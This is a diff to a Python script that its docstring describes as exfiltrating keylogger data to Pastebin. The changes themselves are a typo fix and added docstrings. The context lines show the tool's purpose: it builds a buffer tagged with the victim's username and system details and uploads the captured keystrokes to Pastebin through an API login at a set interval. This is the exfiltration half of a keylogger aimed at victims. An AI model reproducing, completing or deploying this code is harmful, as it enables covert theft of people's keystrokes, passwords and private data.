@@ -1,5 +1,5 @@
 '''
-Script to Exfiltrade all data to PasteBin from keyLogger.
+Script to Exfiltrate all data to PasteBin from keyLogger.
 Yonatan Orozko & Ilona Geftner
 
 '''
@@ -24,6 +24,9 @@ def get_timestamp_str():
 
 # Define API & connect to pastebin
 def get_pastebin_api():
+    '''
+    This function loads the API key from the .env file and returns an api object.
+    '''
     load_dotenv()
     api_dev_key = en['API_DEV_KEY']
     username = en['P_USERNAME']
@@ -44,6 +47,9 @@ def get_pastebin_api():
             
 #Check fill buffer to send.
 def fill_buffer_upload(myInode, uploadInterval):
+    '''
+    This function will fill the buffer and upload it to pastebin every <uploadInterval> seconds.
+    '''
     
     bufferToUp = {getpass.getuser():("Victim details: {}".format(uname()))}
     try:
@@ -75,6 +81,9 @@ def fill_buffer_upload(myInode, uploadInterval):
 #Exfiltrade data to Pastebin every min
 
 def main():
+    '''
+    Prompt user for file and upload interval.
+    '''
     time_to_upload = None
     file_inode = None
     argv = sys.argv[1:]
@@ -82,7 +91,7 @@ def main():
         opts, args = getopt.getopt(argv, "p:t:f:")
      
     except:
-        print('''This script will upload to pastebin data every 30 when data is bigger than 1000bytes evey -t seconds''')
+        print('''This script will upload to pastebin data every <time to upload>  when data is bigger than 1000bytes evey -t seconds''')
     
     for opt, arg in opts:
         if opt in ['-f']:
